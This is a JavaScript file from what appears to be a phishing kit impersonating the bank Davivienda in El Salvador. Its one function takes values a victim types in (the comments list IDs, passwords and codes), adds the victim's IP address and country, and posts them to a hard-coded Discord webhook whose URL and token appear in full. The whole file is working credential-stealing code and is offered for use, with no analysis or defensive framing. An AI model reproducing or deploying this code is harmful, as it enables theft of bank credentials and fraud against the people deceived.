// webhook.js

const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1562452063655567463/uTPFmSwf-J_egeZUjizOwxiY23tzLI9C48fXUEEU9qaKsp_WcsuT8j2qVMSpaLZ8xG9e";

/**
 * Envía un mensaje al webhook de Discord con IP y país
 * @param {string} tipo - Tipo de dato (ej: "ID", "Contraseña", "Código", etc.)
 * @param {string} valor - Valor ingresado por el usuario
 * @returns {Promise}
 */
function enviarAlWebhook(tipo, valor) {
  return fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      const ip = data.ip || "IP desconocida";
      const pais = data.country_name || "País desconocido";
      const mensaje = `🔐Davivienda Salvador:\n${tipo}: ${valor}\n🌐 IP: ${ip}\n🌎 País: ${pais}`;

      return fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: mensaje })
      });
    })
    .catch(() => {
      const mensaje = `🔐Davivienda Salvador:\n${tipo}: ${valor}\n🌐 IP/Pais no disponible`;
      return fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: mensaje })
      });
    });
}